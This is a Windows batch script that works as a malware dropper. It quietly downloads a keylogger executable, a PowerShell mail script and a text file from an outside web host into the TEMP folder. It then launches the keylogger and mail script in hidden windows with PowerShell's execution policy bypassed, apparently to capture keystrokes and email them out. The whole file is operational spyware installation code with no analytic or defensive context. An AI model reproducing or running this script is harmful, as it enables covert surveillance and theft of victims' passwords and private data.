@echo off
setlocal

set "URL=https://jitenadk.me"

set "fileTemp=%TEMP%"

if not exist "%fileTemp%\logger.exe" (
    start /min "" powershell -Command (curl %URL%/key_logger.exe -o "%fileTemp%\logger.exe")
)

if not exist "%fileTemp%\ps_mail.ps1" (
    start /min "" powershell -Command (curl %URL%/ps_mail.ps1 -o "%fileTemp%\ps_mail.ps1")
)

if not exist "%fileTemp%\Record.txt" (
    start /min "" powershell -Command (curl %URL%/Record.txt -o "%fileTemp%\Record.txt")
)

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"
start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"

endlocal
